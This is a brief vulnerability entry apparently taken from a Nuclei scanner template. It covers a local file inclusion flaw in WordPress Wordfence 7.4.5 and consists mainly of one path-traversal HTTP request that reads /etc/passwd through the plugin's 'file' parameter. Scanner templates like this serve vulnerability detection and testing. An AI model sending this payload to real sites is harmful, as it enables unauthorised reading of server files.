# Vulnerability: WordPress Wordfence 7.4.5 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wordpress-wordfence-lfi.yaml`)

## Description
WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd
```

